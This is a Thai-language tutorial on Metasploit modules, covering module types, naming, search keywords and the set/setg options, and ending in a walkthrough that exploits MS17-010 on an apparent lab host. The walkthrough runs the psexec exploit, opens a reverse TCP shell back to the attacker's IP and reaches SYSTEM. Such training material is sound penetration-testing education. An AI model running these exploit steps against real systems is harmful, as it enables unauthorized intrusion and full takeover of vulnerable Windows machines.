
# Metasploit Modules

## Modules คืออะไร?

**Metasploit Modules** คือสคริปต์ที่เตรียมไว้แล้ว มีวัตถุประสงค์เฉพาะและมีฟังก์ชันที่ถูกพัฒนาและทดสอบในสภาพแวดล้อมจริงแล้ว

### ข้อควรระวังสำคัญ:
⚠️ **การที่ Exploit ไม่สำเร็จ ≠ ไม่มีช่องโหว่**
- หลายคนเข้าใจผิดว่าถ้า Metasploit exploit ล้มเหลว แสดงว่าไม่มีช่องโหว่
- ความจริงคือ exploit หลายตัวต้องปรับแต่งให้เหมาะกับเป้าหมาย
- Metasploit ควรเป็นเพียง**เครื่องมือช่วย** ไม่ใช่ทดแทนทักษะ manual ของเรา

---

## โครงสร้างของ Modules

### รูปแบบการตั้งชื่อ:

```
<No.> <type>/<os>/<service>/<name>
```

**ตัวอย่าง:**
```
794   exploit/windows/ftp/scriptftp_list
```

---

## องค์ประกอบของ Module

### 1. **Index No. (หมายเลข)**
- ใช้สำหรับเลือก module ในการค้นหา
- ทำให้เลือก module ได้ง่ายโดยไม่ต้องพิมพ์ path เต็ม

### 2. **Type (ประเภท)**

| Type | คำอธิบาย |
|------|----------|
| **Auxiliary** | สำหรับ Scan, Fuzz, Sniff และความสามารถด้าน admin - ให้การช่วยเหลือเพิ่มเติม |
| **Encoders** | ทำให้แน่ใจว่า payload ไปถึงปลายทางโดยสมบูรณ์ |
| **Exploits** | Module ที่ exploit ช่องโหว่เพื่อส่ง payload |
| **NOPs** | (No Operation code) รักษาขนาด payload ให้คงที่ตลอดการ exploit |
| **Payloads** | โค้ดที่ทำงานจากระยะไกลและเชื่อมต่อกลับมายังเครื่องผู้โจมตี (หรือ shell) |
| **Plugins** | สคริปต์เพิ่มเติมที่สามารถผสานกับ msfconsole ได้ |
| **Post** | Module หลากหลายสำหรับรวบรวมข้อมูล, pivot เข้าลึก ฯลฯ |

### Module ที่ใช้คำสั่ง `use <no.>` ได้:

✅ **Auxiliary** - สำหรับ scanning และงานช่วยเหลือ  
✅ **Exploits** - สำหรับส่ง payload  
✅ **Post** - สำหรับงาน post-exploitation

### 3. **OS (ระบบปฏิบัติการ)**
- ระบุว่า module นี้สร้างมาสำหรับ OS และ architecture ใด
- OS ต่างกันต้องใช้โค้ดต่างกัน

### 4. **Service (บริการ)**
- ชี้ไปที่บริการที่มีช่องโหว่บนเครื่องเป้าหมาย
- สำหรับ auxiliary หรือ post อาจหมายถึงกิจกรรมทั่วไป เช่น "gather" (รวบรวมข้อมูลรับรอง)

### 5. **Name (ชื่อ)**
- อธิบายการกระทำที่สามารถทำได้ด้วย module นี้

---

## การค้นหา Modules

### คำสั่ง `search` ใน Metasploit:

```bash
msf6 > help search
```

### ตัวอย่างการค้นหา:

#### **ค้นหาแบบพื้นฐาน:**
```bash
msf6 > search eternalromance
```

#### **ค้นหาแบบระบุ type:**
```bash
msf6 > search eternalromance type:exploit
```

#### **ค้นหาแบบละเอียด (ใช้หลายเงื่อนไข):**
```bash
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

### Keywords สำคัญที่ใช้ค้นหา:

| Keyword | คำอธิบาย |
|---------|----------|
| `cve` | ค้นหาด้วย CVE ID |
| `type` | ประเภท module (exploit, auxiliary, post, etc.) |
| `platform` | ระบบปฏิบัติการ (windows, linux, etc.) |
| `rank` | ระดับความน่าเชื่อถือ (excellent, good, normal, etc.) |
| `author` | ชื่อผู้เขียน |
| `port` | หมายเลข port |
| `date` | วันที่เปิดเผยช่องโหว่ |

---

## การเลือกและใช้ Module

### ขั้นตอนการใช้งาน:

#### **1. ค้นหา Module:**
```bash
msf6 > search ms17_010
```

**ผลลัพธ์:**
```
#  Name                                      Rank     Check
-  ----                                      ----     -----
0  exploit/windows/smb/ms17_010_eternalblue  average  Yes
1  exploit/windows/smb/ms17_010_psexec       normal   Yes
2  auxiliary/admin/smb/ms17_010_command      normal   No
3  auxiliary/scanner/smb/smb_ms17_010        normal   No
```

#### **2. เลือก Module:**
```bash
msf6 > use 0
# หรือ
msf6 > use exploit/windows/smb/ms17_010_psexec
```

#### **3. ดูตัวเลือก (Options):**
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

#### **4. ดูข้อมูลเพิ่มเติม:**
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > info
```

---

## การตั้งค่า Module

### คำสั่ง `set` และ `setg`:

#### **set - ตั้งค่าชั่วคราว:**
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
```

#### **setg - ตั้งค่าถาวร (จนกว่าจะรีสตาร์ท):**
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15
```

### ตัวแปรสำคัญที่ต้องตั้งค่า:

| ตัวแปร | คำอธิบาย |
|--------|----------|
| **RHOSTS** | IP ของเป้าหมาย (Remote Host) |
| **RPORT** | Port ของเป้าหมาย (มักตั้งไว้แล้ว) |
| **LHOST** | IP ของเครื่องเรา (Local Host) - สำหรับ reverse shell |
| **LPORT** | Port ของเครื่องเรา (Local Port) |

---

## การรัน Exploit

### ตัวอย่างการใช้งานจริง:

#### **ผลการ Scan ด้วย Nmap:**
```bash
nmap -sV 10.10.10.40

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
```

#### **ขั้นตอนใน Metasploit:**

```bash
# 1. ค้นหา exploit
msf6 > search ms17_010

# 2. เลือก module
msf6 > use 1

# 3. ตั้งค่าเป้าหมาย
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40

# 4. ตั้งค่า IP เครื่องเรา
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15

# 5. รัน exploit
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

#### **ผลลัพธ์เมื่อสำเร็จ:**
```bash
[*] Started reverse TCP handler on 10.10.14.15:4444
[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010!
[*] Command shell session 1 opened
[+] =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter> shell
C:\Windows\system32> whoami
nt authority\system
```

---

